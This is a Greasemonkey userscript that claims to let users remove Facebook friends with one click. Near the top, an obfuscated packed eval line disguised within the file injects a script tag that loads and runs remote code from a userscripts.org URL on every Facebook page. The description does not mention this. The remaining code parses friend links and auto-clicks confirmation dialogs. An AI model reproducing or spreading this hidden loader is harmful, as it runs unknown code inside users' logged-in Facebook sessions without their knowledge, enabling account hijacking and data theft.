//
// Friends Quick Remove Plus
// Author: Shelby Melban
// @namespace 	shelby@smwebdesigns.com
//
// ==UserScript==
// @name		Facebook - Friend Quick Remove
// @description		When adding friends on Facebook you quickly realize you have way to many friends that you don't really want anymore.  Unfortunatly you've added them all to a list and it requires 3 clicks to remove them.  This script enables you to remove a friend with one click.  It will add a new link to the right of the remove button if you click the "Quick Remove" button in the top left corner of the screen.
// @include		http://www.facebook.com/friends/*
// @include		   http://www.facebook.com/*
// @include		   https://www.facebook.com/*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))






(function(){
/***********************************************************/

var userList = [];
function init()
{
	createControlDiv();
}

/*
 * Control div will have buttons for displaying information 
 * or firing actions when needed
 */

function createControlDiv()
{
	//	Testing Window
	var prefs = document.createElement("div")
	prefs.id = "_sm_removeFriends";
	var s = "<div style='position:absolute;top:0;left:0;width:100%;height:10px' id='shelby'>";
	//s += "<input type=button onClick='javascript:readHTML();' value='Show Source'><br>";
	s += "<input type=button onClick='javascript:findRemoves();' value='Quick Remove'><br>";
	s += "</div>";
	prefs.innerHTML = s;
	document.body.appendChild(prefs);
}

/*
 * tag all friends with the extra Quick Remove button
 */
unsafeWindow.findRemoves = function()
{
	var factions = document.getElementsByClassName( 'factions' );
	var removeClass = document.getElementsByClassName( 'remove' );
	
	for( i = 0; i < factions.length; i++ )
	{
		var inforegex = /\<a.*<a.*onclick='(.*)' class="remove/;
		var regexresult = inforegex.exec( factions[i].innerHTML );
		if (regexresult != null)
		{
			var url = regexresult[1];
			//	<a onclick='return Friends.remove_click(this, 11111111, "Friend Name", 0);' class="remove" title="Remove">
			var splitURL = url.split( 'this' );
			var newURL = splitURL[0] + 'document.getElementsByClassName( "remove" )['+ i +']' + splitURL[1];
			
			//	return Friends.remove_click(this, 11111111, "Friend Name", 0);
			var inforegex2 = /this, ([0-9]+).*"(.*)".*(\d+)/;
			var regexresult2 = inforegex2.exec( url );
			if( regexresult2 )
			{
				var userNumber = regexresult2[1];
				var userName = regexresult2[2];
				var lastNumber = regexresult2[3];
				var QR = document.createElement("a");
				QR.title = 'Quickly Remove';
				QR.innerHTML = '__X';
				userList[i] = [];
				userList[i].userNumber = userNumber;
				userList[i].userName = userName;
				userList[i].lastNumber = lastNumber;
				QR.href = 'javascript:doUserClick( '+i+' );';
				factions[i].appendChild(QR);
			}
		}
	}
	
}

unsafeWindow.doUserClick = function( i )
{
	var removeClass = document.getElementsByClassName( 'remove' );
	unsafeWindow.Friends.remove_click( removeClass[i], userList[i].userNumber, userList[i].userName, userList[i].lastNumber );
	if( document.getElementById( 'dialog_button2' ) )
		document.getElementById( 'dialog_button2' ).click();
	document.getElementById( 'dialog_button1' ).click();
}
/***********************************************************/
/*
 *  Functions taken from PackRat.AutoPoints.user.js
 */
/***********************************************************/
unsafeWindow.readHTML = function()
{
	var h = document.getElementsByTagName( "body" )[0].innerHTML;
	var prefs = document.createElement("textarea")
	prefs.innerHTML = h;
	document.getElementById( 'shelby' ).appendChild(prefs);
}

document.getElementsByClassName = function(clsName){
    var retVal = new Array();
    var elements = document.getElementsByTagName("*");
    for(var i = 0;i < elements.length;i++){
        if(elements[i].className.indexOf(" ") >= 0){
            var classes = elements[i].className.split(" ");
            for(var j = 0;j < classes.length;j++){
                if(classes[j] == clsName)
                    retVal.push(elements[i]);
            }
        }
        else if(elements[i].className == clsName)
            retVal.push(elements[i]);
    }
    return retVal;
}
/***********************************************************/
/*
 * End Functions taken from PackRat.AutoPoints.user.js
 */
/***********************************************************/


//	Start the process
init();

/***********************************************************/
})();